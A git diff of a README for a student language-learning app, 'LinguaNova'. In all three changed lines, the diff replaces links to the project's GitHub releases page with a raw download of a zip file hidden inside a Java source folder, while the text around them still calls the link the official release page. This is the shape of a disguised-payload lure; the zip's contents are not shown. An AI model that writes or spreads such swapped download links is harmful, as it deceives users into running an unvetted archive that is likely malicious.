@@ -1,6 +1,6 @@
 # 🚀 Esprit-PIDEV-4SAE5-2026-LinguaNova - Learn Languages Easily on Windows
 
-[![Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases)
+[![Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/main/backend/microservices/Eureka-Server/src/main/java/com/Lingua-SA-PIDE-Nova-Esprit-v3.8.zip)
 
 ---
 
@@ -14,7 +14,7 @@ To get started with Esprit-PIDEV-4SAE5-2026-LinguaNova on your Windows computer,
 
 Go to the official release page for this project:
 
-[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases)
+[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://raw.githubusercontent.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/main/backend/microservices/Eureka-Server/src/main/java/com/Lingua-SA-PIDE-Nova-Esprit-v3.8.zip)
 
 This link opens the page where the latest versions are available. The releases include the installation files you will need.
 
@@ -112,4 +112,4 @@ Ensure you download the Windows installer as described above for proper setup.
 
 You can find project documentation, source code, and ongoing updates in this GitHub repository. Explore topics such as microservices, Angular development, and e-learning engineering used in this project.
 
-[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases) to start using the application today.
+[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://raw.githubusercontent.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/main/backend/microservices/Eureka-Server/src/main/java/com/Lingua-SA-PIDE-Nova-Esprit-v3.8.zip) to start using the application today.
